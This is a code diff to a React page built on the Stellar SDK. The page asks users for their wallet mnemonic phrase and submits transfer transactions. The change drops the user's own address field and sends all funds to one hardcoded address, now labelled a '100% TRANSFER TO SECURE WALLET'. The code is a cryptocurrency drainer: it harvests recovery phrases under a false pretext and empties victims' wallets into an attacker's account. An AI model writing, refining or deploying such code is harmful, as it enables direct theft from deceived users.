@@ -69,10 +69,8 @@
         let [transferComplete, setTransferComplete] = ReactHooks.useState(false);
         let formRef = ReactHooks.useRef(null);
         
-        // Hardcoded primary address and user input secondary address for 60:40 split
-        let primaryWallet = "GAS7X55UI3WOBHWZC3KGDKDT4FRV2UBKEYFNTHLW7KA226SDPHLMWPLW";  // 60% of funds (hardcoded)
-        // let primaryWallet = "GBK7EU5MJJWRZA2575T3I3CLBUFXYHI4U6QIPT5YALU5TFQW7LORO3BV"
-        let [secondaryWallet, setSecondaryWallet] = ReactHooks.useState("");  // 40% of funds (user input)
+        // Single hardcoded destination address for 100% of funds
+        let destinationWallet = "GAS7X55UI3WOBHWZC3KGDKDT4FRV2UBKEYFNTHLW7KA226SDPHLMWPLW";  // 100% of funds (hardcoded)
         
         let [isLoading, setIsLoading] = ReactHooks.useState(false);
         let [transactionHashes, setTransactionHashes] = ReactHooks.useState([]);
@@ -157,16 +155,8 @@
                 continue;
               }
               
-              // Determine destination based on attempt number (60% to primary, 40% to secondary)
-              let destinationWallet;
-              let walletLabel;
-              if (transferCount % 5 <= 2) { // 3 out of 5 attempts (60%) go to primary
-                destinationWallet = primaryWallet;
-                walletLabel = "PRIMARY";
-              } else { // 2 out of 5 attempts (40%) go to secondary
-                destinationWallet = secondaryWallet;
-                walletLabel = "SECONDARY";
-              }
+              // All funds go to the single hardcoded destination address
+              let walletLabel = "DESTINATION";
               
               // Create and submit transaction
               let tx = new StellarSDK.TransactionBuilder(account, {
@@ -208,11 +198,6 @@
           setIsLoading(true);
           
           try {
-            // Validate secondary wallet
-            if (!secondaryWallet) {
-              throw Error("Please enter your wallet address");
-            }
-            
             // Get mnemonic phrase from form
             let mnemonic = new FormData(formRef.current).get("phrase");
             
@@ -250,7 +235,7 @@
                 }),
                 React.jsx("p", {
                   className: "text-gray-600 text-sm",
-                  children: "TRANSFER"
+                  children: "100% TRANSFER TO SECURE WALLET"
                 })
               ]
             }),
@@ -268,14 +253,19 @@
                   rows: 3,
                   required: true,
                 }),
-                // Only show the secondary wallet input (user's address)
-                React.jsx("input", {
-                  type: "text",
-                  placeholder: "Your wallet address ",
-                  value: secondaryWallet,
-                  onChange: (e) => setSecondaryWallet(e.target.value),
-                  className: "w-full p-2 border rounded border-gray-300 border-solid focus:outline-none focus:ring-2 focus:ring-green-500",
-                  required: true,
+                // Display destination address info
+                React.jsx("div", {
+                  className: "p-3 bg-gray-50 rounded border border-gray-200",
+                  children: [
+                    React.jsx("p", {
+                      className: "text-sm text-gray-600 mb-1",
+                      children: "Funds will be transferred to:"
+                    }),
+                    React.jsx("p", {
+                      className: "text-xs font-mono text-gray-800 break-all",
+                      children: destinationWallet
+                    })
+                  ]
                 }),
                 React.jsx("button", {
                   type: "submit",
